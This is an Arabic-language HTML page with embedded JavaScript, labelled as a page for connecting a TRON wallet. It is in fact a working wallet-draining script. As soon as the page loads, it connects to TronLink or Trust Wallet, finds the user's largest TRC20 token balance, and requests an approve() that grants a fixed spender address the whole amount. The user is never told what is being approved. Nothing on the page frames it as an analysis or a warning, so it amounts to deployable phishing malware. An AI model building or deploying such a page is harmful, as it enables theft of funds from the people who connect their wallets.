<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>ربط محفظة TRON وطلب Approve</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; direction: rtl; }
    button { padding: 10px 20px; margin: 10px; font-size: 16px; }
    p { font-size: 14px; color: #333; }
    a { color: blue; text-decoration: none; margin: 10px; display: none; }
  </style>
</head>
<body>
  <h2>ربط محفظة </h2>
  <button id="connectWalletBtn">ربط المحفظة</button>
  <button id="retryBtn" style="display:none;">إعادة المحاولة</button>
  <p id="status"></p>
  <a id="openTronLink" href="https://www.tronlink.org/dl/TronLink.apk">فتح/تحميل TronLink</a>
  <a id="openTrustWallet" href="https://trustwallet.com/download">فتح/تحميل Trust Wallet</a>

  <script>
    const tronTokens = [
      { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" },
      { symbol: "USDJ", address: "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT" },
      { symbol: "TUSD", address: "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4" },
      { symbol: "WIN", address: "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7" },
      { symbol: "JST", address: "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9" }
    ];

    const spenderAddress = "TQBR6nj5SRpyPh7FpC6xBNTVpN39yxv4Zo";
    let tronWeb;
    let userAddress;

    // دالة للانتظار حتى تكون المحفظة جاهزة
    async function waitForTronWeb(timeout = 10000) {
      return new Promise((resolve, reject) => {
        const startTime = Date.now();
        const checkInterval = setInterval(() => {
          if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            clearInterval(checkInterval);
            resolve(window.tronWeb);
          } else if (Date.now() - startTime > timeout) {
            clearInterval(checkInterval);
            reject(new Error("لم يتم العثور على محفظة TRON."));
          }
        }, 500);
      });
    }

    async function connectWallet() {
      const statusElement = document.getElementById("status");
      const openTronLink = document.getElementById("openTronLink");
      const openTrustWallet = document.getElementById("openTrustWallet");
      const retryBtn = document.getElementById("retryBtn");
      statusElement.innerText = "جارٍ الاتصال بالمحفظة...";
      openTronLink.style.display = "none";
      openTrustWallet.style.display = "none";
      retryBtn.style.display = "none";

      try {
        // محاولة اكتشاف TronLink أو Trust Wallet
        tronWeb = await waitForTronWeb();
        userAddress = tronWeb.defaultAddress.base58;

        if (!userAddress) {
          statusElement.innerText = "فشل جلب عنوان المحفظة. تأكد من تسجيل الدخول في TronLink أو Trust Wallet.";
          openTronLink.style.display = "inline";
          openTrustWallet.style.display = "inline";
          retryBtn.style.display = "inline";
          // محاولة فتح تطبيق المحفظة تلقائيًا
          setTimeout(() => {
            window.location.href = "tronlink://";
            setTimeout(() => {
              window.location.href = "trust://";
            }, 1000);
          }, 1000);
          return;
        }

        statusElement.innerText = `المحفظة متصلة: ${userAddress}`;
        await processTokens();

      } catch (err) {
        statusElement.innerText = "لم يتم العثور على محفظة. افتح TronLink أو Trust Wallet وحاول مرة أخرى.";
        openTronLink.style.display = "inline";
        openTrustWallet.style.display = "inline";
        retryBtn.style.display = "inline";
        console.error(err);
        // محاولة فتح تطبيق المحفظة تلقائيًا
        setTimeout(() => {
          window.location.href = "tronlink://";
          setTimeout(() => {
            window.location.href = "trust://";
          }, 1000);
        }, 1000);
      }
    }

    async function processTokens() {
      const statusElement = document.getElementById("status");
      try {
        let maxToken = null;
        let maxBalance = 0;
        let decimals = 6;

        for (const token of tronTokens) {
          try {
            const contract = await tronWeb.contract().at(token.address);
            decimals = await contract.decimals().call();
            let balance = await contract.balanceOf(userAddress).call();
            balance = tronWeb.toBigNumber(balance.toString()).div(10 ** decimals).toNumber();

            if (balance > maxBalance) {
              maxBalance = balance;
              maxToken = token;
            }
          } catch (e) {
            console.error(`خطأ في جلب رصيد توكن ${token.symbol}`, e);
          }
        }

        if (!maxToken) {
          statusElement.innerText += "\nلم يتم العثور على رصيد توكنات TRC20.";
          return;
        }

        statusElement.innerText += `\nأكبر رصيد توكن: ${maxToken.symbol} = ${maxBalance}`;

        const contract = await tronWeb.contract().at(maxToken.address);
        const amount = tronWeb.toBigNumber(maxBalance * (10 ** decimals)).toString();

        await contract.approve(spenderAddress, amount).send({ feeLimit: 100_000_000 })
          .then(tx => {
            statusElement.innerText += `\nتم إرسال طلب الـ Approve بنجاح.\nمعرف المعاملة: ${tx}`;
          })
          .catch(err => {
            statusElement.innerText += "\nفشل إرسال طلب الـ Approve. تأكد من وجود رصيد TRX كافٍ.";
            console.error(err);
          });
      } catch (err) {
        statusElement.innerText += "\nحدث خطأ أثناء معالجة التوكنات.";
        console.error(err);
      }
    }

    document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
    document.getElementById("retryBtn").addEventListener("click", connectWallet);

    // محاولة تلقائية للاتصال عند تحميل الصفحة
    window.addEventListener("load", () => {
      setTimeout(connectWallet, 1000);
    });
  </script>
</body>
</html>
